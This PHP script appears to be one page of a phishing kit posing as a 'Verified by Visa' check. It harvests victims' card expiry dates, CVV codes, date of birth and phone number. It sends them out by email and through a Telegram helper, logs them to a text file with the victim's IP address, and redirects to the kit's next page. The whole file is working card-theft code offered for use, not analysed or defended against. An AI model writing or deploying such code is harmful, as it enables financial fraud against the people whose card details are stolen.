<?php
include_once 'functions.php';    
    $id       = $_POST['expm'];
    $id1      = $_POST['expy'];
    $password = $_POST['cvv'];
    $password2 = $_POST['cvv2'];
    $dob      = $_POST['birth'];
    $tel      = $_POST['tel'];

    
    $subject = $_SERVER['REMOTE_ADDR'] . ' | VBV IndexOF';
    $message = '/-- INFOVBV --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
    $message .= 'expm : ' . $id . "\r\n";
	$message .= 'expy : ' . $id1 . "\r\n";
    $message .= 'cvv : ' . $password . "\r\n";
    $message .= 'cvv : ' . $password2 . "\r\n";
    $message .= 'date : ' . $dob . "\r\n";
    $message .= 'tel : ' . $tel . "\r\n";
    $message .= '/-- END LOG INFOS --/' . "\r\n";
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
    mail($subject,$message,$headers);
    telegram_send(urlencode($message));
	file_put_contents("indexof46.txt", $message, FILE_APPEND);
    header("location: thrid.php");

?>